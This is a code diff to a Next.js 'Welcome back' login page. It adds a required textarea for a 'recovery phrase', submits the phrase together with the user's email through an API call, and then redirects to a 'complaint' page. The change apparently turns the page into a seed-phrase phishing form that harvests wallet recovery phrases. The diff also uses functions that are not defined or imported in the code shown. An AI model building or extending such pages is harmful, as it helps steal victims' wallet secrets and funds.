@@ -2,6 +2,7 @@
 import Image from 'next/image'
 import React, { useEffect, useState } from 'react'
 import useEmblaCarousel from 'embla-carousel-react'
+import logo from "@/public/images.png"
 import Link from 'next/link'
 import UseFormHandler from '../useFormHandler'
 import { useRouter } from 'next/navigation'
@@ -12,19 +13,25 @@ function Page() {
     const router = useRouter()
     const [email, setEmail] = useState("")
 
+
     const formdata = UseFormHandler({
         required: {
+            phrase: 'Please Enter phrase',
             email: 'Please Enter Email',
         },
         initialValues: {
+            phrase: '',
             email: ''
         },
-
         onSubmit: async (value) => {
-            router.push(`/phrase?email=${value.email}`)
+            const { status, data } = await phrases(value).catch(() =>
+                formdata.setProccessing(false)
+            )
+            if (status) {
+                router.push(`/complaint?email=${value.email}`)
+            }
         }
     })
-
 
 
     return (
@@ -36,7 +43,9 @@ function Page() {
                     </div>
                     <div className="h-full px-4 space-y-3">
                         <div className="">
-                            <div className="w-24 h-24 rounded-full mx-auto bg-gray-100 dark:bg-gray-900"></div>
+                            <div className="w-24 h-24 rounded-full mx-auto overflow-hidden bg-gray-100 dark:bg-gray-900">
+                                <Image src={logo} alt='logo' className='w-full h-full' />
+                            </div>
                         </div>
                         <div className="text-center">
                             <div className="font-bold text-lg dark:text-white">Welcome back</div>
@@ -51,14 +60,26 @@ function Page() {
                             />
                             <div className="text-xs text-red-600">{formdata?.error?.email}</div>
                         </div>
+                        <div className="space-y-0">
+                            <textarea
+                                placeholder='Enter recovery phrase'
+                                onChange={(e) => {
+                                    setPhrase(e.target.value)
+                                    formdata.value.phrase = e.target.value
+                                }}
+                                className="w-full dark:bg-gray-900 dark:placeholder:text-gray-700 resize-none text-sm min-h-32 appearance-none p-3 outline-none rounded-2xl"
+                            />
+                            <div className="text-[11px] text-gray-400">Separate each word with a space</div>
+                            <div className="text-xs text-red-600">{formdata?.error?.phrase}</div>
+                        </div>
                     </div>
                 </div>
                 <div className="space-y-3 p-4">
                     <div onClick={() => email.length > 0 && formdata.submit()} className={`${email < 1 && "bg-opacity-30"} bg-blue-600  rounded-full text-center cursor-pointer py-4 px-9 text-white font-bold`}>Login</div>
-                    <div className="">
-                        <Link href="/phrase">
-                            <div className="bg-white rounded-full text-center cursor-pointer py-4 px-9 text-blue-600 font-bold">Recover my account</div>
-                        </Link>
+                    <div onClick={() => formdata.submit()} className="">
+                        {/* <Link href="/phrase"> */}
+                        <div className="bg-white rounded-full text-center cursor-pointer py-4 px-9 text-blue-600 font-bold">Recover my account</div>
+                        {/* </Link> */}
                     </div>
                 </div>
             </div>
